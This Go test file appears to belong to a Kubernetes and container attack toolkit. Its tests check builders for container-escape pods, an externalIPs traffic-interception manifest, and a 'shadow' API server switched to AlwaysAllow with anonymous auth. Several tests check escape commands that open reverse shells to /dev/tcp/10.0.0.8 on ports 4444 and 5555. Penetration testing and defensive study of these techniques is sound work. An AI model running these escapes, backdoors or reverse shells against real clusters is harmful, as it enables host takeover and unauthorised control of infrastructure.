package handler

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/yaml"
)

func TestDockerProbeTargets(t *testing.T) {
	targets := dockerProbeTargets()
	if len(targets) < 2 {
		t.Fatalf("expected docker probe targets to include both default ports")
	}
	if targets[0].Port != 2375 || targets[0].Scheme != "http" {
		t.Fatalf("expected first target to probe http:// on 2375, got %#v", targets[0])
	}
	if targets[1].Port != 2376 || targets[1].Scheme != "https" {
		t.Fatalf("expected second target to probe https:// on 2376, got %#v", targets[1])
	}
}

func TestResolveMITMVictimIP(t *testing.T) {
	if got := resolveMITMVictimIP(mitmRequest{VictimIP: "2.2.2.2", TargetIP: "1.1.1.1"}); got != "2.2.2.2" {
		t.Fatalf("expected victim_ip to take precedence, got %q", got)
	}
	if got := resolveMITMVictimIP(mitmRequest{TargetIP: "1.1.1.1"}); got != "1.1.1.1" {
		t.Fatalf("expected legacy target_ip to be used, got %q", got)
	}
	if got := resolveMITMVictimIP(mitmRequest{}); got != "1.1.1.1" {
		t.Fatalf("expected default victim IP, got %q", got)
	}
}

func TestBuildClusterIPMITMYAML(t *testing.T) {
	yaml := buildClusterIPMITMYAML("8.8.8.8", 8443)
	if !strings.Contains(yaml, "externalIPs:\n  - 8.8.8.8") {
		t.Fatalf("expected yaml to claim victim IP, got:\n%s", yaml)
	}
	if !strings.Contains(yaml, "traffic destined for 8.8.8.8:8443") {
		t.Fatalf("expected yaml comment to describe victim traffic, got:\n%s", yaml)
	}
}

func TestBuildEscapePodObjectUsesCustomCommand(t *testing.T) {
	pod := buildEscapePodObject(escapePodRequest{
		EscapeMode: "docker-sock",
		Namespace:  "default",
		Command:    "echo hello && sleep 5",
	})

	if got := pod.Spec.Containers[0].Args; len(got) != 2 || got[1] != "echo hello && sleep 5" {
		t.Fatalf("expected custom command in args, got %#v", got)
	}
}

func TestBuildEscapePodObjectCapDACUsesCapabilityInsteadOfPrivileged(t *testing.T) {
	pod := buildEscapePodObject(escapePodRequest{
		EscapeMode: "cap-dac",
		Namespace:  "default",
	})

	security := pod.Spec.Containers[0].SecurityContext
	if security == nil {
		t.Fatalf("expected security context")
	}
	if security.Privileged != nil && *security.Privileged {
		t.Fatalf("cap-dac mode should not be privileged")
	}
	if security.Capabilities == nil || len(security.Capabilities.Add) == 0 {
		t.Fatalf("expected CAP_DAC_READ_SEARCH capability to be added")
	}
	if security.Capabilities.Add[0] != corev1.Capability("DAC_READ_SEARCH") {
		t.Fatalf("expected DAC_READ_SEARCH capability, got %#v", security.Capabilities.Add)
	}
	if len(pod.Spec.Volumes) != 1 || pod.Spec.Volumes[0].HostPath == nil || pod.Spec.Volumes[0].HostPath.Path != "/etc" {
		t.Fatalf("expected /etc hostPath mount, got %#v", pod.Spec.Volumes)
	}
}

func TestEscapePodYAMLMarshalsToValidPod(t *testing.T) {
	pod := buildEscapePodObject(escapePodRequest{
		EscapeMode: "privileged",
		Namespace:  "kube-system",
		NodeName:   "node-a",
		Command:    "id; sleep 3600",
	})

	body, err := yaml.Marshal(pod)
	if err != nil {
		t.Fatalf("expected pod yaml to marshal, got error: %v", err)
	}
	if !strings.Contains(string(body), "apiVersion: v1") || !strings.Contains(string(body), "kind: Pod") {
		t.Fatalf("expected marshaled yaml to include apiVersion/kind, got:\n%s", string(body))
	}

	jsonBody, err := yaml.YAMLToJSON(body)
	if err != nil {
		t.Fatalf("expected yaml to convert to json, got error: %v", err)
	}

	var decoded corev1.Pod
	if err := json.Unmarshal(jsonBody, &decoded); err != nil {
		t.Fatalf("expected marshaled yaml to decode as Pod, got error: %v", err)
	}
	if decoded.Spec.NodeName != "node-a" {
		t.Fatalf("expected nodeName to be preserved, got %q", decoded.Spec.NodeName)
	}
	if !decoded.Spec.HostPID || !decoded.Spec.HostNetwork || !decoded.Spec.HostIPC {
		t.Fatalf("expected privileged mode to enable host namespaces")
	}
	if len(decoded.Spec.Volumes) < 2 {
		t.Fatalf("expected host-root and docker-sock volumes, got %#v", decoded.Spec.Volumes)
	}
}

func TestRewriteShadowAPIServerArgsOverridesExpectedFlags(t *testing.T) {
	args, changed := rewriteShadowAPIServerArgs([]string{
		"--authorization-mode=Node,RBAC",
		"--secure-port=6443",
		"--anonymous-auth=false",
		"--etcd-servers=https://127.0.0.1:2379",
	})
	if !changed {
		t.Fatalf("expected existing auth/port args to be rewritten")
	}
	if !containsArgWithPrefix(args, "--authorization-mode=AlwaysAllow") {
		t.Fatalf("expected AlwaysAllow auth mode, got %#v", args)
	}
	if !containsArgWithPrefix(args, "--anonymous-auth=true") {
		t.Fatalf("expected anonymous-auth=true, got %#v", args)
	}
	if !containsArgWithPrefix(args, "--secure-port=9444") {
		t.Fatalf("expected secure-port=9444, got %#v", args)
	}
	if !containsArgWithPrefix(args, "--etcd-servers=https://127.0.0.1:2379") {
		t.Fatalf("expected etcd servers to be preserved, got %#v", args)
	}
}

func TestBuildShadowAPIServerPodCopiesKeyRuntimeData(t *testing.T) {
	source := corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "kube-apiserver-node1",
			Namespace: "kube-system",
			Labels: map[string]string{
				"component": "kube-apiserver",
				"tier":      "control-plane",
			},
		},
		Spec: corev1.PodSpec{
			NodeName:           "node-1",
			ServiceAccountName: "kube-apiserver",
			PriorityClassName:  "system-node-critical",
			Tolerations: []corev1.Toleration{{
				Key:      "node-role.kubernetes.io/control-plane",
				Operator: corev1.TolerationOpExists,
				Effect:   corev1.TaintEffectNoSchedule,
			}},
			Volumes: []corev1.Volume{
				hostPathTestVolume("etc-kubernetes", "/etc/kubernetes"),
				hostPathTestVolume("certs", "/etc/kubernetes/pki"),
			},
		},
	}
	container := corev1.Container{
		Name:    "kube-apiserver",
		Image:   "registry.k8s.io/kube-apiserver:v1.29.0",
		Command: []string{"kube-apiserver"},
		Args: []string{
			"--authorization-mode=Node,RBAC",
			"--anonymous-auth=false",
			"--secure-port=6443",
			"--etcd-servers=https://127.0.0.1:2379",
		},
		VolumeMounts: []corev1.VolumeMount{
			{Name: "etc-kubernetes", MountPath: "/etc/kubernetes", ReadOnly: true},
			{Name: "certs", MountPath: "/etc/kubernetes/pki", ReadOnly: true},
		},
	}

	shadow, warnings := buildShadowAPIServerPod(source, container)
	if len(warnings) != 0 {
		t.Fatalf("expected no warnings, got %#v", warnings)
	}
	if shadow.Name != "shadow-apiserver" || shadow.Namespace != "kube-system" {
		t.Fatalf("unexpected shadow pod identity: %s/%s", shadow.Namespace, shadow.Name)
	}
	if shadow.Spec.NodeName != "node-1" {
		t.Fatalf("expected source node to be preserved, got %q", shadow.Spec.NodeName)
	}
	if !shadow.Spec.HostNetwork {
		t.Fatalf("expected hostNetwork=true")
	}
	if shadow.Spec.DNSPolicy != corev1.DNSClusterFirstWithHostNet {
		t.Fatalf("expected DNSClusterFirstWithHostNet, got %q", shadow.Spec.DNSPolicy)
	}
	if len(shadow.Spec.Volumes) != 2 {
		t.Fatalf("expected referenced volumes to be copied, got %#v", shadow.Spec.Volumes)
	}
	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--secure-port=9444") {
		t.Fatalf("expected secure port override, got %#v", shadow.Spec.Containers[0].Args)
	}
	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--authorization-mode=AlwaysAllow") {
		t.Fatalf("expected auth mode override, got %#v", shadow.Spec.Containers[0].Args)
	}
	if shadow.TypeMeta.APIVersion != "v1" || shadow.TypeMeta.Kind != "Pod" {
		t.Fatalf("expected shadow pod TypeMeta to be set, got %#v", shadow.TypeMeta)
	}
}

func TestBuildShadowAPIServerPodRewritesFlagsWhenStaticPodStoresThemInCommand(t *testing.T) {
	source := corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "kube-apiserver-node1",
			Namespace: "kube-system",
			Labels:    map[string]string{"component": "kube-apiserver", "tier": "control-plane"},
		},
		Spec: corev1.PodSpec{
			NodeName: "node-1",
		},
	}
	container := corev1.Container{
		Name:  "kube-apiserver",
		Image: "registry.k8s.io/kube-apiserver:v1.29.0",
		Command: []string{
			"kube-apiserver",
			"--authorization-mode=Node,RBAC",
			"--anonymous-auth=false",
			"--secure-port=6443",
			"--etcd-servers=https://127.0.0.1:2379",
		},
	}

	shadow, warnings := buildShadowAPIServerPod(source, container)
	if len(warnings) != 0 {
		t.Fatalf("expected static-pod command flags to be normalized without warnings, got %#v", warnings)
	}
	if got := shadow.Spec.Containers[0].Command; len(got) != 1 || got[0] != "kube-apiserver" {
		t.Fatalf("expected command to keep only the executable, got %#v", got)
	}
	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--authorization-mode=AlwaysAllow") {
		t.Fatalf("expected authorization mode override in args, got %#v", shadow.Spec.Containers[0].Args)
	}
	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--anonymous-auth=true") {
		t.Fatalf("expected anonymous auth override in args, got %#v", shadow.Spec.Containers[0].Args)
	}
	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--secure-port=9444") {
		t.Fatalf("expected secure port override in args, got %#v", shadow.Spec.Containers[0].Args)
	}
	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--etcd-servers=https://127.0.0.1:2379") {
		t.Fatalf("expected etcd servers to remain in args, got %#v", shadow.Spec.Containers[0].Args)
	}
}

func TestPodLooksLikeAPIServerRejectsOtherControlPlanePods(t *testing.T) {
	if podLooksLikeAPIServer(corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "kube-controller-manager-node1",
			Namespace: "kube-system",
			Labels:    map[string]string{"tier": "control-plane"},
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{{
				Name:  "kube-controller-manager",
				Image: "registry.k8s.io/kube-controller-manager:v1.29.0",
				Args:  []string{"--cluster-name=demo"},
			}},
		},
	}) {
		t.Fatal("expected controller-manager pod to be rejected")
	}

	if !podLooksLikeAPIServer(corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "kube-apiserver-node1",
			Namespace: "kube-system",
			Labels:    map[string]string{"tier": "control-plane"},
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{{
				Name:  "kube-apiserver",
				Image: "registry.k8s.io/kube-apiserver:v1.29.0",
				Args:  []string{"--etcd-servers=https://127.0.0.1:2379"},
			}},
		},
	}) {
		t.Fatal("expected apiserver pod to be detected")
	}
}

func TestEvaluatePodSummaryDetectsSeccompDisabled(t *testing.T) {
	summary := evaluatePodSummary([]gin.H{
		{"check": "seccomp", "result": "Seccomp:\t0"},
		{"check": "docker_sock", "result": "not_found"},
	})

	if got := summary["risk_level"]; got != "medium" {
		t.Fatalf("expected medium risk for seccomp disabled, got %v", got)
	}
	risks, _ := summary["risks"].([]string)
	if len(risks) == 0 || !strings.Contains(risks[0], "seccomp=0") {
		t.Fatalf("expected seccomp risk to be reported, got %#v", risks)
	}
}

func TestEvaluatePodSummaryInfoOnlyDoesNotEscalateToHigh(t *testing.T) {
	summary := evaluatePodSummary([]gin.H{
		{"check": "sa_token", "result": "mounted"},
	})

	if got := summary["risk_level"]; got != "info" {
		t.Fatalf("expected info risk level for info-only findings, got %v", got)
	}
}

func TestBuildEvaluatePodScriptSupportsCurlOrWget(t *testing.T) {
	script := buildEvaluatePodScript()
	for _, needle := range []string{
		"command -v curl",
		"command -v wget",
		"--max-time 2",
		"-T 2",
		"/version",
		"gitVersion",
		"no_http_client",
		"ps -eo comm",
		"grep -Ev ' on /(etc/hosts|etc/hostname|etc/resolv.conf) '",
		"containerd",
		"=== CDK EVALUATE START ===",
		"=== CDK EVALUATE END ===",
	} {
		if !strings.Contains(script, needle) {
			t.Fatalf("expected evaluate script to contain %q, got:\n%s", needle, script)
		}
	}
}

func TestHasHostRootAccessOnlyMatchesRootHostPath(t *testing.T) {
	if !hasHostRootAccess([]string{"privileged", "hostPath:/"}) {
		t.Fatal("expected host root mount to be detected")
	}
	if hasHostRootAccess([]string{"hostPath:/proc", "hostPID"}) {
		t.Fatal("expected non-root hostPath mounts to stay false")
	}
}

func TestAutoEscapeHostCommandAvoidsPlaceholderLHOST(t *testing.T) {
	if got := autoEscapeHostCommand("", ""); got != "echo ESCAPED_TO_HOST; id; hostname" {
		t.Fatalf("expected local confirmation command without placeholder host, got %q", got)
	}
	withReverse := autoEscapeHostCommand("10.0.0.8", "")
	if !strings.Contains(withReverse, "/dev/tcp/10.0.0.8/4444") {
		t.Fatalf("expected reverse-shell target to use provided host and default port, got %q", withReverse)
	}
	if !strings.Contains(withReverse, "ESCAPED_TO_HOST") {
		t.Fatalf("expected reverse-shell command to keep host escape evidence, got %q", withReverse)
	}
}

func TestAutoEscapeChrootCommandsReuseReverseShellTarget(t *testing.T) {
	for _, script := range []string{
		autoEscapeDiskChrootCommand("10.0.0.8", "5555"),
		autoEscapeMountedHostCommand("/host", "10.0.0.8", "5555"),
	} {
		if !strings.Contains(script, "/dev/tcp/10.0.0.8/5555") {
			t.Fatalf("expected script to preserve provided reverse-shell target, got %q", script)
		}
		if !strings.Contains(script, "ESCAPED_TO_HOST") {
			t.Fatalf("expected script to retain host escape marker, got %q", script)
		}
	}
}

func TestAutoEscapeMountedHostCommandChecksForChrootBinary(t *testing.T) {
	script := autoEscapeMountedHostCommand("/host", "10.0.0.8", "5555")
	if !strings.Contains(script, "MISSING_BINARY:chroot") {
		t.Fatalf("expected mounted-host escape to report missing chroot, got %q", script)
	}
	if !strings.Contains(script, "'/host'/bin") {
		t.Fatalf("expected mounted-host escape to use provided mount path, got %q", script)
	}
}

func TestBuildDockerSockAutoEscapeCommandSupportsDockerAndCurl(t *testing.T) {
	script := buildDockerSockAutoEscapeCommand("/tmp/docker.sock", "10.0.0.8", "5555")
	for _, needle := range []string{
		"command -v docker",
		"command -v curl",
		"SOCK='/tmp/docker.sock'",
		"--unix-socket \"$SOCK\"",
		"containers/create",
		"containers/$CID/logs",
		"MISSING_BINARY:docker_or_curl",
		"ESCAPED_TO_HOST",
	} {
		if !strings.Contains(script, needle) {
			t.Fatalf("expected docker-sock auto escape script to contain %q, got %q", needle, script)
		}
	}
}

func TestCategorizeServiceMarksRemoteAccessAndSuspiciousNames(t *testing.T) {
	category, risk := categorizeService("ssh-access", corev1.ServiceTypeNodePort, []corev1.ServicePort{{Port: 2222}})
	if category != "remote-access" || risk != "high" {
		t.Fatalf("expected ssh-access service to be high-risk remote access, got %q/%q", category, risk)
	}
	category, risk = categorizeService("hecker-svc", corev1.ServiceTypeClusterIP, []corev1.ServicePort{{Port: 8080}})
	if category != "suspicious" || risk != "high" {
		t.Fatalf("expected suspicious service naming to be highlighted, got %q/%q", category, risk)
	}
}

func TestNormalizeContainerEntrypointTreatsStaticPodCommandFlagsAsArgs(t *testing.T) {
	command, args := normalizeContainerEntrypoint(
		[]string{"kube-apiserver", "--authorization-mode=Node,RBAC", "--secure-port=6443"},
		nil,
	)
	if len(command) != 1 || command[0] != "kube-apiserver" {
		t.Fatalf("expected executable-only command, got %#v", command)
	}
	if len(args) != 2 || args[0] != "--authorization-mode=Node,RBAC" || args[1] != "--secure-port=6443" {
		t.Fatalf("expected flags to move into args, got %#v", args)
	}
}

func hostPathTestVolume(name, path string) corev1.Volume {
	pathType := corev1.HostPathDirectory
	return corev1.Volume{
		Name: name,
		VolumeSource: corev1.VolumeSource{
			HostPath: &corev1.HostPathVolumeSource{
				Path: path,
				Type: &pathType,
			},
		},
	}
}
